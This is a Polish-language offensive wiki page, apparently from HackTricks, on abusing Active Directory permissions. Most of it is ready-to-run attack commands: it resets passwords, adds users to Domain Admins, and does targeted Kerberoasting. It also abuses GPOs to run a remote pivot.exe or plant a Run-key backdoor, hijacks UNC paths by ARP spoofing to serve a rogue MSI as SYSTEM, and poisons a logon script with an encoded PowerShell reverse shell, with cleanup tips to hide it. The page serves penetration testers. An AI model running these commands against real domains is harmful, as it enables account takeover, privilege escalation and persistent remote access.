# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest głównie podsumowaniem technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **oraz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Po więcej szczegółów sprawdź oryginalne artykuły.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

To uprawnienie daje atakującemu pełną kontrolę nad docelowym kontem użytkownika. Gdy prawa `GenericAll` zostaną potwierdzone za pomocą komendy `Get-ObjectAcl`, atakujący może:

- **Zmienić hasło celu**: Używając `net user <username> <password> /domain`, atakujący może zresetować hasło użytkownika.
- Z Linux, możesz zrobić to samo przez SAMR za pomocą Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Jeśli konto jest wyłączone, wyczyść flagę UAC**: `GenericAll` pozwala edytować `userAccountControl`. Z Linux, BloodyAD może usunąć flagę `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby uczynić je podatnym na kerberoasting, a następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić i spróbować złamać hashe ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Wyłącz pre-authentication dla użytkownika, czyniąc jego konto podatnym na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mając `GenericAll` na użytkowniku, możesz dodać certyfikowane poświadczenie i uwierzytelniać się jako ta osoba bez zmiany jej hasła. Zobacz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupach, jeśli ma `GenericAll` rights na grupie takiej jak `Domain Admins`. Po zidentyfikowaniu distinguished name grupy za pomocą `Get-NetGroup`, atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub używając modułów takich jak Active Directory lub PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Z Linux możesz również wykorzystać BloodyAD, aby dodać siebie do dowolnych grup, gdy masz nad nimi GenericAll/Write membership. Jeśli grupa docelowa jest zagnieżdżona w „Remote Management Users”, natychmiast uzyskasz dostęp WinRM na hostach honorujących tę grupę:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie kontroli nad obiektem komputera.
- **Shadow Credentials**: Użyj tej techniki, aby podszyć się pod konto komputera lub użytkownika, wykorzystując uprawnienia do tworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma uprawnienia `WriteProperty` do wszystkich obiektów dla określonej grupy (np. `Domain Admins`), może:

- **Dodać siebie do grupy Domain Admins**: Możliwe poprzez połączenie komend `net user` i `Add-NetGroupUser`; ta metoda pozwala na eskalację uprawnień w domenie.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

To uprawnienie umożliwia atakującym dodanie siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń, które bezpośrednio manipulują członkostwem w grupie. Użycie następującej sekwencji poleceń pozwala na dodanie siebie:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie, pozwala atakującym bezpośrednio dodawać siebie do grup poprzez modyfikację właściwości grup, jeśli mają prawo `WriteProperty` na tych grupach. Potwierdzenie i wykonanie tego uprawnienia są wykonywane za pomocą:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` pozwala na resetowanie haseł bez znajomości bieżącego hasła. Weryfikację tego uprawnienia i jego wykorzystanie można wykonać przez PowerShell lub alternatywne narzędzia wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne oraz one-linery dla środowisk nieinteraktywnych. Polecenia obejmują zarówno proste wywołania PowerShell, jak i użycie `rpcclient` w Linux, pokazując wszechstronność wektorów ataku.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Jeśli atakujący odkryje, że ma uprawnienia `WriteOwner` do grupy, może zmienić jej właściciela na siebie. Ma to szczególnie duże znaczenie, gdy chodzi o grupę `Domain Admins`, ponieważ zmiana właściciela daje szerszą kontrolę nad atrybutami grupy i członkostwem. Proces obejmuje zidentyfikowanie właściwego obiektu za pomocą `Get-ObjectAcl`, a następnie użycie `Set-DomainObjectOwner` do zmodyfikowania właściciela, either by SID or name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite na User**

To uprawnienie pozwala atakującemu modyfikować właściwości user. W szczególności, przy dostępie `GenericWrite`, atakujący może zmienić ścieżkę logon script użytkownika, aby wykonać złośliwy script podczas logon user. Osiąga się to za pomocą komendy `Set-ADObject`, aby zaktualizować właściwość `scriptpath` docelowego user tak, by wskazywała na script atakującego.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite na Group**

Dzięki temu uprawnieniu atakujący mogą manipulować członkostwem w grupach, na przykład dodając siebie lub innych użytkowników do określonych grup. Proces ten obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Z Linux, Samba `net` can add/remove members, gdy masz `GenericWrite` na grupie (przydatne, gdy PowerShell/RSAT są niedostępne):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD i posiadanie na nim uprawnień `WriteDACL` umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` do tego obiektu. Osiąga się to poprzez manipulację ADSI, co daje pełną kontrolę nad obiektem oraz możliwość modyfikowania jego członkostwa w grupach. Mimo to istnieją ograniczenia podczas próby wykorzystania tych uprawnień za pomocą cmdletów `Set-Acl` / `Get-Acl` modułu Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Szybkie przejęcie WriteDACL/WriteOwner (PowerView)

Gdy masz `WriteOwner` i `WriteDacl` nad użytkownikiem lub kontem usługi, możesz przejąć pełną kontrolę i zresetować jego hasło za pomocą PowerView, bez znajomości starego hasła:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Uwagi:
- Możesz najpierw potrzebować zmienić właściciela na siebie, jeśli masz tylko `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

Atak DCSync wykorzystuje konkretne uprawnienia replikacji w domenie, aby naśladować Domain Controller i synchronizować dane, w tym poświadczenia użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, co pozwala atakującym wyciągać wrażliwe informacje z środowiska AD bez bezpośredniego dostępu do Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegowany dostęp do zarządzania Group Policy Objects (GPOs) może stanowić istotne ryzyko bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` ma delegowane prawa do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Te uprawnienia mogą zostać nadużyte do złośliwych celów, co można wykryć za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Aby zidentyfikować błędnie skonfigurowane GPOs, można łączyć polecenia PowerSploit. Umożliwia to wykrycie GPOs, którymi określony użytkownik ma uprawnienia zarządzania: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Możliwe jest ustalenie, do których komputerów stosuje się konkretne GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Aby zobaczyć, jakie polityki są zastosowane do konkretnego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identyfikację jednostek organizacyjnych (OUs) objętych daną polityką można wykonać za pomocą `Get-DomainOU`.

Możesz też użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound), aby wyliczać GPOs i znajdować w nich problemy.

### Abuse GPO - New-GPOImmediateTask

Błędnie skonfigurowane GPOs mogą zostać wykorzystane do uruchamiania kodu, na przykład przez utworzenie natychmiastowego zadania harmonogramu. Można to zrobić, aby dodać użytkownika do lokalnej grupy administratorów na dotkniętych maszynach, znacząco podnosząc uprawnienia:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i linkowanie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, aby uruchamiać backdoory na dotkniętych komputerach. Ta metoda wymaga zaktualizowania GPO oraz zalogowania się użytkownika do komputera, aby doszło do wykonania:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferuje metodę abuse istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez potrzeby tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do tworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuś aktualizację zasad

Aktualizacje GPO zwykle występują mniej więcej co 90 minut. Aby przyspieszyć ten proces, zwłaszcza po wprowadzeniu zmiany, na komputerze docelowym można użyć polecenia `gpupdate /force`, aby wymusić natychmiastową aktualizację zasad. To polecenie zapewnia, że wszelkie modyfikacje GPO zostaną zastosowane bez czekania na następny automatyczny cykl aktualizacji.

### Od kuchni

Po przejrzeniu Scheduled Tasks dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań, takich jak `evilTask`. Zadania te są tworzone przez skrypty lub narzędzia wiersza poleceń, których celem jest modyfikacja zachowania systemu lub eskalacja uprawnień.

Struktura zadania, jak pokazano w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask`, opisuje szczegóły zaplanowanego zadania — w tym polecenie do wykonania i jego wyzwalacze. Ten plik przedstawia, jak zaplanowane zadania są definiowane i zarządzane w obrębie GPO, zapewniając metodę wykonywania dowolnych poleceń lub skryptów w ramach egzekwowania zasad.

### Users and Groups

GPO umożliwiają także manipulowanie członkostwem użytkowników i grup na systemach docelowych. Edytując bezpośrednio pliki zasad Users and Groups, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegacji uprawnień do zarządzania GPO, która pozwala na modyfikowanie plików zasad w celu dodawania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracyjny XML dla Users and Groups opisuje, jak te zmiany są wdrażane. Dodając wpisy do tego pliku, konkretnym użytkownikom można nadać podwyższone uprawnienia w dotkniętych systemach. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.

Ponadto można również rozważyć dodatkowe metody wykonywania kodu lub utrzymywania persistence, takie jak wykorzystanie skryptów logon/logoff, modyfikowanie kluczy rejestru dla autoruns, instalowanie oprogramowania przez pliki .msi lub edytowanie konfiguracji usług. Techniki te zapewniają różne sposoby utrzymywania dostępu i kontrolowania systemów docelowych poprzez abuse GPO.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` na OU/domain pozwala zmodyfikować atrybut `gPLink` kontenera docelowego i **wymusić zastosowanie istniejącego GPO** bez edycji samego GPO. Staje się to interesujące, gdy podpięty GPO już odwołuje się do zdalnej zawartości przez **UNC paths** (`\\HOST\share\...`), ponieważ uwierzytelnieni użytkownicy mogą odczytać **SYSVOL** i szukać wielokrotnego użycia policy offline.

Ogólny przebieg:

1. Użyj BloodHound, aby zidentyfikować podmiot z `WriteGPLink` na OU i wyliczyć komputery/użytkowników wewnątrz tego OU.
2. Sklonuj `SYSVOL` w trybie tylko do odczytu i przeanalizuj GPO w poszukiwaniu **Software Installation**, mapowań dysków (`Drives.xml`) oraz skryptów `logon/startup`, które odwołują się do UNC paths.
3. Preferuj policy wskazujące na **bezpośredni hostname** (na przykład `\\DC02\share\pkg.msi`) zamiast ścieżek DFS/domain-namespace, ponieważ ścieżki oparte na hostname łatwiej przekierować przy użyciu L2 spoofing.
4. Dołącz wybrany identyfikator GUID GPO do `gPLink` docelowego OU, aby ofiara przetwarzała już istniejącą policy.
5. W tej samej domenie rozgłoszeniowej wykonaj ARP spoofing hosta UNC i powiąż jego IP lokalnie (`ip addr add <target_ip>/32 dev <iface>`), aby ruch SMB ofiary trafiał do twojego hosta.
6. Udostępnij oczekiwaną ścieżkę/nazwę pliku z serwera SMB atakującego (na przykład `smbserver.py`) i poczekaj na normalne przetwarzanie policy.

Przykład zbierania `SYSVOL` i korelacji GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Połącz istniejące GPO z docelowym OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Jeśli powiązany GPO wdraża MSI z UNC path, klient pobierze je podczas **computer startup** i zainstaluje jako **`NT AUTHORITY\SYSTEM`**. Fałszując wskazany host i serwując złośliwe MSI pod **tym samym share/path/name**, możesz zamienić **WriteGPLink** w wykonanie kodu jako SYSTEM **bez modyfikowania SYSVOL**.

Ważne ograniczenia:

- **Timing ma znaczenie**: nowy link jest widoczny przy odświeżaniu policy (zwykle ~90 minut), ale **Software Installation** zazwyczaj uruchamia się po **reboot**.
- Windows Installer zwykle śledzi wdrożenie za pomocą **`ProductCode`** pakietu. Jeśli produkt jest już zainstalowany, wdrożenie może zostać pominięte.
- Aby uniknąć odrzucenia przez installer, zmodyfikuj rogue MSI tak, aby jego **`ProductCode`** i **`PackageCode`** pasowały do legalnego pakietu oczekiwanego przez GPO.
- Stare pliki `.aas` advertisement mogą nadal znajdować się w `SYSVOL`, więc zweryfikuj, czy wdrożenie nadal wygląda na aktywne, zanim zaczniesz na nim polegać.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Mapowania dysków GPP w `Drives.xml` powodują, że użytkownicy uwierzytelniają się do skonfigurowanej ścieżki UNC podczas logowania lub ponownego połączenia. Jeśli podszyjesz się pod wskazany host, możesz przechwycić **NetNTLMv2**. Jeśli SMB zostanie celowo doprowadzone do niepowodzenia, Windows może ponowić próbę przez **WebDAV**, wysyłając **NTLM over HTTP**, co jest znacznie bardziej elastyczne do relay do **LDAP(S)**, **AD CS** lub **SMB**.

#### Logon/startup script UNC hijack

Ten sam wzorzec dotyczy skryptów hostowanych przez UNC wykrytych w `SYSVOL`:

- **Logon scripts** zwykle uruchamiają się w kontekście **user**.
- **Startup scripts** zwykle uruchamiają się w kontekście **computer / SYSTEM**.

Jeśli ścieżka skryptu wskazuje na podatną na podszycie nazwę hosta, przekieruj hosta UNC i serwuj zastępczą zawartość skryptu z oczekiwanej lokalizacji.

## SYSVOL/NETLOGON Logon Script Poisoning

Zapisywalne ścieżki w `\\<dc>\SYSVOL\<domain>\scripts\` lub `\\<dc>\NETLOGON\` pozwalają na manipulację skryptami logowania wykonywanymi przy logowaniu usera przez GPO. Daje to code execution w security context logujących się użytkowników.

### Locate logon scripts
- Sprawdź atrybuty usera pod kątem skonfigurowanego logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Przeszukaj udziały domeny, aby znaleźć skróty lub odwołania do skryptów:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizuj pliki `.lnk`, aby rozwiązać cele wskazujące do SYSVOL/NETLOGON (przydatny trik DFIR i dla atakujących bez bezpośredniego dostępu do GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound wyświetla atrybut `logonScript` (scriptPath) na węzłach użytkowników, gdy jest obecny.

### Zweryfikuj write access (nie ufaj listingom share)
Zautomatyzowane narzędzia mogą pokazywać SYSVOL/NETLOGON jako tylko do odczytu, ale podstawowe ACL NTFS nadal mogą pozwalać na zapisy. Zawsze testuj:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Jeśli rozmiar pliku lub mtime się zmieni, masz write. Zachowaj oryginały przed modyfikacją.

### Zatruj skrypt logowania VBScript dla RCE
Dodaj na końcu polecenie, które uruchamia PowerShell reverse shell (wygeneruj z revshells.com) i zachowaj oryginalną logikę, aby nie zepsuć działania biznesowego:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Nasłuchuj na swoim hoście i czekaj na następne interaktywne logowanie:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- Wykonanie odbywa się pod tokenem użytkownika logującego (nie SYSTEM). Zakresem jest link GPO (OU, site, domain) stosujący ten skrypt.
- Posprzątaj, przywracając oryginalną zawartość/timestampy po użyciu.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
